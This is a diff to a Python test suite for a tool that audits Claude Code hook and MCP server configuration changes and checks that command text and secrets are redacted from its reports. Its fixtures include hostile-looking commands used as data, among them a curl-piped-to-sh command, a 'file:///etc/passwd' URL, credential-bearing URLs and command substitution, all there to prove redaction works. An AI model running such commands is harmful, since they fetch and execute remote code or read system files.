@@ -47,6 +47,7 @@ from agents_shipgate.core.host_grants import (
     DETAIL_NOT_SHOWN,
     DISPLAY_ONLY_GRANT_FIELDS,
     MAX_DETAIL_MATCHER_CHARS,
+    MAX_DETAIL_MATCHER_INPUT_CHARS,
     MAX_DETAIL_WORD_CHARS,
     MAX_HOOK_HANDLERS,
     HostStaticParseCache,
@@ -78,7 +79,7 @@ HOOK_HEADER = "⚠ high widened claude-code .claude/settings.json"
 MCP_HEADER = "⚠ high widened claude-code .mcp.json"
 
 
-def _hooks(matcher: str, command: str, timeout: float) -> dict:
+def _hooks(matcher: str, command: str, timeout: object) -> dict:
     return {"hooks": {"PostToolUse": [{"matcher": matcher, "hooks": [
         {"type": "command", "command": command, "timeout": timeout},
     ]}]}}
@@ -92,6 +93,16 @@ def _digest(command: str) -> str:
     """How a row prints a command's digest: the first twelve hex digits."""
 
     return "sha256:" + redacted_config_sha256(command)[:12]
+
+
+def _args_digest(args: list[str], package: str | None) -> str:
+    """An MCP server's `args_sha256`: the arguments, the package marked, beside its position."""
+
+    if package is None:
+        return redacted_config_sha256(args)
+    index = args.index(package)
+    marked = [*args[:index], "<package>", *args[index + 1 :]]
+    return redacted_config_sha256({"args": marked, "package_index": index})
 
 
 #: The issue's reproduction: (file, base, head, `diff` entry header, the changed field).
@@ -197,8 +208,11 @@ def test_the_grants_publish_the_detail_the_rows_render(tmp_path: Path) -> None:
     assert hook["handlers"][0]["command"]["sha256"] == expected
     [server] = _grants(root, "mcp_server")
     assert server["package"] == "example-mcp-server@1.2.3"
-    # Every other argument is digested, the package replaced by its marker.
-    assert server["args_sha256"] == redacted_config_sha256(["-y", "<package>", "--port", "8080"])
+    # Every other argument is digested, the package replaced by its marker and
+    # its position digested beside them.
+    assert server["args_sha256"] == redacted_config_sha256(
+        {"args": ["-y", "<package>", "--port", "8080"], "package_index": 1}
+    )
     assert "args" not in server and "omitted_args" not in server
 
     inventory = _inventory(root)
@@ -315,6 +329,29 @@ def test_a_timeout_written_as_another_number_names_both(tmp_path: Path) -> None:
     assert len(payload["rows"]) == 1
 
 
+@pytest.mark.parametrize(
+    ("head", "change"),
+    [
+        ("5", 'PostToolUse: timeout 5 → "5"'),
+        ("1e+100", 'PostToolUse: timeout 5 → "1e+100"'),
+        # Text that does not read as a finite number is printed as it is.
+        ("5s", "PostToolUse: timeout 5 → 5s"),
+        ("inf", "PostToolUse: timeout 5 → inf"),
+    ],
+)
+def test_a_timeout_written_as_text_that_reads_as_a_number_is_quoted(
+    tmp_path: Path, head: str, change: str
+) -> None:
+    """`"timeout": 5` → `"5"` read `timeout 5 → 5` (#819 review, cycle 5)."""
+
+    repo = _repository(
+        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", 5)}, {SETTINGS: _hooks("Edit", "bin/lint.sh", head)}
+    )
+    [hook] = _grants(repo, "hook")
+    assert hook["handlers"][0]["timeout"] == head
+    _every_route(repo, tmp_path / "out", change)
+
+
 #: A timeout of one followed by 400 zeros: an integer no float can hold, which
 #: `math.isfinite` raised `OverflowError` on (#819 review, cycle 2). Its text
 #: is 401 digits, more than the 309 of the largest float.
@@ -398,7 +435,7 @@ def test_an_argument_edit_names_the_digests_and_never_the_argument(tmp_path: Pat
         {".mcp.json": _server("-y", "example-mcp-server@1.2.3", "--root", "/srv/private-docs")},
     )
     [server] = _grants(repo, "mcp_server")
-    base = redacted_config_sha256(["-y", "<package>", "--root", "/srv/public"])[:12]
+    base = _args_digest(["-y", "example-mcp-server@1.2.3", "--root", "/srv/public"], "example-mcp-server@1.2.3")[:12]
     change = f"docs: launch arguments changed (sha256:{base} → sha256:{server['args_sha256'][:12]})"
     _every_route(repo, tmp_path / "out", change)
     text, payload = _diff(repo)
@@ -453,6 +490,8 @@ LEAK_COMMANDS = [
     "curl --token \\\ncontinued-canary https://x.invalid",
     "curl -u \\\nadmin:continuedpw-canary https://x.invalid",
     "curl https://x.invalid/?a&b&c&d; echo urlseparator-canary",
+    # Cycle 5: a URL as the first word published its host as the executable.
+    "http://deploy:c5pw-canary@c5host-canary.corp.internal?token=c5query-canary x",
     # Plain argument words, which no redaction rule would ever name.
     "bin/run.sh --mode plainword-canary --out ./plainpath-canary",
 ]
@@ -509,7 +548,7 @@ def _assert_no_secret(outputs: list[str]) -> None:
 
 
 def test_no_command_or_argument_text_reaches_any_output_or_artifact(tmp_path: Path) -> None:
-    """Every payload of the four earlier review cycles, on every route and in every file written.
+    """Every payload of the earlier review cycles, on every route and in every file written.
 
     The inventory, a saved baseline, a drift payload, `diff` text and JSON,
     `check` text and its boundary JSON, `verify` text and every file it
@@ -629,6 +668,15 @@ def test_a_value_the_digest_already_redacts_stays_quiet_as_before(tmp_path: Path
         ("API_KEY=first-canary curl https://x.invalid", DETAIL_NOT_SHOWN),
         ("'my tool.sh' --fix", DETAIL_NOT_SHOWN),
         ("https://hooks.example.invalid/secret-path/run.sh", DETAIL_NOT_SHOWN),
+        # A URL with no path published its host: the digest's input keeps a
+        # URL's host and drops its userinfo, query and path (#819 review, cycle 5).
+        ("https://evil.invalid", DETAIL_NOT_SHOWN),
+        ("https://evil.invalid?token=abc", DETAIL_NOT_SHOWN),
+        ("http://user:pw@secret-host.internal", DETAIL_NOT_SHOWN),
+        ("http://deploy:hunter2@build-cache.corp.internal?token=abc123 x", DETAIL_NOT_SHOWN),
+        ("'https://evil.invalid'", DETAIL_NOT_SHOWN),
+        ("ftp://files.internal", DETAIL_NOT_SHOWN),
+        ("file:///etc/passwd", DETAIL_NOT_SHOWN),
         (f"{GITHUB_TOKEN} run", DETAIL_NOT_SHOWN),
         ("$(cat /tmp/x) run", DETAIL_NOT_SHOWN),
         ("|| true", DETAIL_NOT_SHOWN),
@@ -656,6 +704,10 @@ def test_the_executable_is_a_plain_token_or_not_named(command: str, executable: 
         (["pkg@1.2.3-beta.1"], "pkg@1.2.3-beta.1"),
         (["mcp-outline==1.10.1"], "mcp-outline==1.10.1"),
         (["--from", "mcp-server-fetch[cli]==2025.1.3", "mcp-server-fetch"], "mcp-server-fetch[cli]==2025.1.3"),
+        # `uvx --with` names an extra requirement beside the server, not the
+        # server (#819 review, cycle 5).
+        (["--with", "requests==2.31.0", "mcp-foo==1.2.0"], "mcp-foo==1.2.0"),
+        (["--with", "requests==2.31.0", "mcp-foo"], None),
         (["run", "-i", "--rm", "ghcr.io/github/github-mcp-server:v0.5.0"], "ghcr.io/github/github-mcp-server:v0.5.0"),
         (["run", "--rm", "mcp/fetch@sha256:" + "0a1b2c3d" * 8], "mcp/fetch@sha256:" + "0a1b2c3d" * 8),
         (["run", "-e", "GITHUB_TOKEN", "localhost:5000/team/img:1.0"], "localhost:5000/team/img:1.0"),
@@ -685,8 +737,30 @@ def test_only_a_package_of_the_strict_shape_is_published(args: list[str], packag
 
     published, digest = _mcp_launch_args({"command": "npx", "args": args})
     assert published == package
-    marked = [("<package>" if item == package else item) for item in args]
-    assert digest == redacted_config_sha256(marked)
+    assert digest == _args_digest(args, package)
+
+
+def test_a_literal_marker_argument_never_hides_an_argument_edit(tmp_path: Path) -> None:
+    """The package and the digest determine the arguments, a literal `<package>` among them (#819 review, cycle 5).
+
+    Replacing the package by the marker alone made these two lists digest
+    alike, so the entry read "no difference in … launch arguments".
+    """
+
+    repo = _repository(
+        tmp_path,
+        {".mcp.json": _server("-y", "pkg@1.0.0", "<package>")},
+        {".mcp.json": _server("-y", "<package>", "pkg@1.0.0")},
+    )
+    [server] = _grants(repo, "mcp_server")
+    head = _args_digest(["-y", "<package>", "pkg@1.0.0"], "pkg@1.0.0")
+    assert (server["package"], server["args_sha256"]) == ("pkg@1.0.0", head)
+    base = _args_digest(["-y", "pkg@1.0.0", "<package>"], "pkg@1.0.0")
+    assert base != head
+    text, _ = _diff(repo)
+    assert _table_entry(text, MCP_HEADER)[1] == (
+        f"docs: launch arguments changed (sha256:{base[:12]} → sha256:{head[:12]})"
+    )
 
 
 def test_arguments_that_are_not_a_list_are_digested_as_declared(tmp_path: Path) -> None:
@@ -779,6 +853,28 @@ def test_a_matcher_passes_the_published_label_redaction_and_its_bound(tmp_path: 
     assert hook["handlers"][0]["matcher"] == long[: MAX_DETAIL_MATCHER_CHARS - 1] + "…"
     assert hook["handlers"][1]["matcher"] == "Bash|[REDACTED:github_token]"
     assert hook["handlers"][2]["matcher"] == DETAIL_NOT_SHOWN
+
+
+def test_a_matcher_past_the_input_bound_is_not_shown_and_never_redacted(tmp_path: Path) -> None:
+    """The label redaction's quadratic patterns made a 128 KiB matcher take 4.2 s (#819 review, cycle 5).
+
+    A matcher up to the bound is redacted, then cut; a longer one is not
+    shown, since cutting it before the redaction could publish part of a
+    credential.
+    """
+
+    at_bound = "Edit|" * (MAX_DETAIL_MATCHER_INPUT_CHARS // 5) + "x" * (MAX_DETAIL_MATCHER_INPUT_CHARS % 5)
+    assert len(at_bound) == MAX_DETAIL_MATCHER_INPUT_CHARS
+    root = tmp_path / "repo"
+    _write(root, SETTINGS, {"hooks": {"PreToolUse": [
+        {"matcher": at_bound, "hooks": [{"type": "command", "command": "bin/a.sh"}]},
+        {"matcher": at_bound + "x", "hooks": [{"type": "command", "command": "bin/b.sh"}]},
+        {"matcher": "-eyJ" * 32_768, "hooks": [{"type": "command", "command": "bin/c.sh"}]},
+    ]}})
+    [hook] = _grants(root, "hook")
+    assert [handler["matcher"] for handler in hook["handlers"]] == [
+        at_bound[: MAX_DETAIL_MATCHER_CHARS - 1] + "…", DETAIL_NOT_SHOWN, DETAIL_NOT_SHOWN,
+    ]
 
 
 # --- the PR comment keeps every row -----------------------------------------
@@ -1059,6 +1155,14 @@ def _long_mcp_file(command: str, *args: str) -> tuple[str, dict]:
     return ".mcp.json", {"mcpServers": {"docs": {"command": command, "args": list(args)}}}
 
 
+def _long_matcher_file(matcher: str, handlers: int = 0) -> tuple[str, dict]:
+    """One matcher group: a handler with a command, then ``handlers`` more with none."""
+
+    return SETTINGS, {"hooks": {"Stop": [{"matcher": matcher, "hooks": [
+        {"type": "command", "command": "bin/stop.sh"}, *([{}] * handlers),
+    ]}]}}
+
+
 #: Repository text that took time quadratic in its length to publish (#819
 #: review): (file, contents, the hook's published executable, or ``None`` for
 #: an MCP server, whose package none of them is).
@@ -1076,6 +1180,18 @@ _LONG_SHAPES = {
     "quoted assignment": (*_long_mcp_file("npx", "token" * (_NEAR_BOUND // 5) + "='x'"), None),
     "credential run": (*_long_hook_file("password" * (_NEAR_BOUND // 8)), DETAIL_NOT_SHOWN),
     "one long first word": (*_long_hook_file("x" * _NEAR_BOUND), DETAIL_NOT_SHOWN),
+    # The label redaction's jwt and database-URL patterns, reached through a
+    # matcher (#819 review, cycle 5: 128 KiB took 4.2 s), and one matcher
+    # under many handlers, which was redacted once per handler.
+    "jwt matcher": (*_long_matcher_file("-eyJ" * (_NEAR_BOUND // 4)), "stop.sh"),
+    "database url matcher": (*_long_matcher_file("postgres://a:" * (_NEAR_BOUND // 13)), "stop.sh"),
+    "matcher under many handlers": (
+        *_long_matcher_file("x" * (_NEAR_BOUND // 2), handlers=_NEAR_BOUND // 8), "stop.sh",
+    ),
+    "bounded matcher under many handlers": (
+        *_long_matcher_file("-eyJ" * (MAX_DETAIL_MATCHER_INPUT_CHARS // 4), handlers=_NEAR_BOUND // 4 - 300),
+        "stop.sh",
+    ),
 }
 
 
@@ -1103,7 +1219,7 @@ def test_a_file_at_the_reader_bound_is_read_in_linear_time(tmp_path: Path, name:
         assert (grant["package"], len(grant["args_sha256"])) == (None, 64)
     else:
         assert grant["handlers"][0]["command"]["executable"] == executable
-    assert len(json.dumps(grant)) < 2000
+    assert len(json.dumps(grant)) < 4096
 
 
 # --- loading basis and the documented shape ---------------------------------
@@ -1154,6 +1270,36 @@ def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Pa
     )
     assert "example.invalid" not in text
     assert len(payload["rows"]) == 1
+
+
+_OUTSIDE_THE_SHAPE = {"hooks": {"PostToolUse": {"matcher": "Edit", "hooks": [
+    {"type": "command", "command": "curl https://example.invalid | sh"},
+]}}}
+
+
+@pytest.mark.parametrize("side", ["base", "head"])
+def test_one_side_outside_the_documented_shape_names_that_side_and_lists_the_other(
+    tmp_path: Path, side: str
+) -> None:
+    """A PR repairing a hook block that did not load read as though the new block were malformed (#819 review, cycle 5).
+
+    The row named neither side, and hid the matcher and command of the side
+    that is in the shape.
+    """
+
+    shaped = _hooks("Edit", "bin/a.sh", 10)
+    base, head = (_OUTSIDE_THE_SHAPE, shaped) if side == "base" else (shaped, _OUTSIDE_THE_SHAPE)
+    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})
+    other = "head" if side == "base" else "base"
+    change = (
+        f"PostToolUse: {side} matcher, command and timeout not shown (the declaration is not a "
+        f"list of matcher groups whose hooks are objects); {other} (matcher Edit; command a.sh "
+        f"{_digest('bin/a.sh')}; timeout 10)"
+    )
+    _every_route(repo, tmp_path / "out", change)
+    text, payload = _diff(repo)
+    assert [(row["before"], row["after"]) for row in payload["rows"]] == [("PostToolUse", "PostToolUse")]
+    assert "example.invalid" not in text + json.dumps(payload)
 
 
 def test_a_change_to_an_unpublished_hook_setting_says_it_is_not_shown(tmp_path: Path) -> None:
